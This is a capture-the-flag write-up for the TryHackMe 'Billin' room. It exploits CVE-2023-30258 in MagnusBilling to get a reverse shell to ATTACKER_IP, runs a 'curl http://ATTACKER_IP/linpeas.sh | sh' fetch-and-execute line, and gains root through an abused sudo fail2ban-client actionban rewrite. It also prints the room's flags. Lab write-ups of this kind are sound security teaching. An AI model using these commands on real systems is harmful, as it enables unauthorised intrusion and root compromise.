# Billin Room — TryHackMe

> **Objective:** Gain initial access to the machine, retrieve `user.txt`, then escalate privileges to root and obtain `root.txt`.

# Reconnaissance

We begin with a standard service scan.


```BASH
sudo nmap -sS -sV 10.114.188.79
```

**The scan reveals three open ports:**

* 22/tcp — SSH

* 80/tcp — Apache HTTP Server

* 3306/tcp — MariaDB

Interesting findings:

* The web server is running Apache.

* MariaDB is accessible externally but requires authentication.

* SSH is running OpenSSH 9.2.

This suggests that the web server is the most promising initial attack vector.

# Web Server Enumeration

We start by running Gobuster.


```BASH
gobuster dir -w /home/deb88/lists/common.txt -u http://10.114.188.79
```

The following results are returned:

```
/index.php -> ./mbilling
/robots.txt
```

Several log files are also discovered. However, the server returns `403 Forbidden`, preventing us from accessing their contents directly.

The redirect from `/index.php` to `/mbilling` indicates that the application is running MagnusBilling. Therefore, we focus our further investigation on this application.

# Searching for Known Vulnerabilities

We use Nuclei to search for known vulnerabilities.

```BASH
nuclei -u http://TARGET -severity low,medium,high,critical
```

Nuclei identifies the following vulnerability:

```
CVE-2023-30258
```

The vulnerable file is:

```
/mbilling/lib/icepay/icepay.php
```

This is a critical remote code execution (RCE) vulnerability in MagnusBilling.

It allows an attacker to execute operating system commands without authentication through command injection in a request parameter.

# Obtaining a Reverse Shell

We use an existing exploit:

[https://github.com/hadrian3689/magnus_billing_rce/tree/main](https://github.com/hadrian3689/magnus_billing_rce/tree/main) 


```
python3 magnus_rce.py \
-t http://T_IP/mbilling/ \
-lh ATTACKER_IP \
-lp 9999
```

On our machine, we start a Netcat listener:


```BASH
nc -lvnp 9999
```

After successful exploitation, we obtain a shell:

```BASH
asterisk@target:/var/www/html/mbilling/lib/icepay$
```

We now have initial access to the machine as the asterisk user.

# Initial System Inspection

We inspect the filesystem.

```BASH
cd /
ls -la
```

The system has a standard Debian directory structure.

Next, we investigate the users' home directories.

In the following directory:

```BASH
/home/magnus
```

we find the first flag:

```
user.txt
```

Its contents are:

```
THM{4a6831d5f124b25eefb1e92e0f0da4ca}
```

# Searching for Privilege Escalation Methods

To identify potential privilege escalation vectors, we use LinPEAS.

On our machine, we start a temporary HTTP server:


```BASH
sudo python3 -m http.server 80
```

On the target machine, we execute:

```BASH
curl http://ATTACKER_IP/linpeas.sh | sh
```

We can also try to obtain a fully **interactive shell:**


```BASH
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Alternatively:**

```BASH
script -qc /bin/bash /dev/null
```

However, these commands do not grant root access by themselves. They only provide a more convenient interactive shell. We still need to find a way to escalate our privileges.

# Checking Sudo Permissions

The next step is to check which commands the current user is allowed to execute with sudo.


```BASH
sudo -l
```

We get the following result:

```
(ALL) NOPASSWD:
/usr/bin/fail2ban-client
```

This means that the asterisk user can execute the `fail2ban-client` program as root without entering a password.

This permission is particularly interesting because it may provide a way to escalate privileges.

# What Is Fail2Ban?

Fail2Ban is a security tool designed to protect services against brute-force attacks.

It monitors service log files.

If an IP address repeatedly performs suspicious actions, such as entering an incorrect SSH password, Fail2Ban can temporarily ban that IP address.

Each jail contains several actions.

These actions can include:

* Adding an iptables rule.

* Sending an email notification.

* Executing an external script.

The last option is particularly interesting for our purposes.

# Checking Active Jails

We check which Fail2Ban jails are currently active.

Bash

```BASH
sudo fail2ban-client status
```

The output includes:

```
sshd
asterisk-manager
mbilling_login
...
```

This confirms that the sshd jail exists and is active.

We can now investigate whether its actions can be modified.

# Exploiting Fail2Ban

We use two commands to exploit the available sudo permissions.

## First Command


```BASH
sudo fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /home/root.txt && chmod 777 /home/root.txt'"
```

Let's break this command down.

### `sudo fail2ban-client`

Runs `fail2ban-client` with root privileges.

This client allows us to modify the configuration of the running Fail2Ban daemon without directly editing its configuration files.

### `set`

Changes an existing setting.

### `sshd`

Specifies the jail we want to modify.

In this case, we are modifying the jail responsible for protecting SSH.

### `action`

Specifies that we are modifying one of the actions associated with this jail.

### `iptables-multiport`

This is the name of the action we want to modify.

Normally, this action executes a command similar to:

```
iptables -I INPUT ...
```

This command adds a firewall rule to block an IP address.

We are going to replace the command associated with this action.

### `actionban`

This is the command that Fail2Ban executes when it bans a new IP address.

By default, it contains a command similar to:


```BASH
iptables -I INPUT ...
```

**We replace it with our own command:**

```BASH
/bin/bash -c 'cat /root/root.txt > /home/root.txt && chmod 777 /home/root.txt'
```

Let's examine what this command does.

First:

```BASH
/bin/bash -c
```

tells Bash to execute the command provided as a string.

Next:

```BASH
cat /root/root.txt
```

reads the contents of `root.txt`.

Since Fail2Ban runs as root, this command is also executed with root privileges. Therefore, it can read a file that is inaccessible to the `asterisk` user.

The output is redirected to:


```BASH
> /home/root.txt
```

This creates a new file outside the `/root` directory and writes the contents of the original `root.txt` into it.

**Finally:**

```BASH
chmod 777 /home/root.txt
```

makes the new file readable, writable, and executable by all users.

We do not obtain a root shell directly. Instead, we make a root process copy the contents of a protected file to a publicly accessible location.

# Second Command

Now we execute the second command:

```BASH
sudo fail2ban-client set sshd banip 127.0.0.1
```

This command triggers the mechanism we configured previously.

It tells Fail2Ban to ban the specified IP address:

```
127.0.0.1
```

We use this address simply as an arbitrary target for the ban.

When `banip` is executed, Fail2Ban processes the new ban and automatically invokes the associated action:

```
actionban
```

However, we have already replaced the default command with our own.

As a result, instead of adding a firewall rule, **Fail2Ban executes:**


```BASH
/bin/bash -c 'cat /root/root.txt > /home/root.txt && chmod 777 /home/root.txt'
```

This command runs with root privileges.

The two commands work together:

1. The first command replaces the action that Fail2Ban executes when banning an IP address.

2. The second command artificially triggers a ban, causing Fail2Ban to execute our modified action.

# Obtaining the Root Flag

After executing the second command, all that remains is to read the newly created file.


```BASH
cat /home/root.txt
```

We successfully retrieve the contents:

```
THM{33ad5b530e71a172648f424ec23fae60}
```

We have obtained the root flag without needing to gain access to a fully privileged root shell.

# Summary

The exploitation process followed these steps:

1. Scanned the target using Nmap.

2. Enumerated the web server using Gobuster.

3. Discovered the MagnusBilling application.

4. Searched for known vulnerabilities using Nuclei.

5. Exploited CVE-2023-30258 to obtain a shell as the `asterisk` user.

6. Retrieved `user.txt`.

7. Checked sudo permissions using `sudo -l`.

8. Discovered permission to execute `fail2ban-client` without a password.

9. Modified the `actionban` command in the `sshd` jail.

10. Triggered a ban event using `banip`.

11. Executed a command with root privileges.

12. Copied `root.txt` to an accessible location and retrieved the second flag.

# Resources

* [https://juggernaut-sec.com/fail2ban-lpe/](https://juggernaut-sec.com/fail2ban-lpe/) 

* [https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/](https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/) 

* [https://github.com/hadrian3689/magnus_billing_rce/tree/main](https://github.com/hadrian3689/magnus_billing_rce/tree/main)
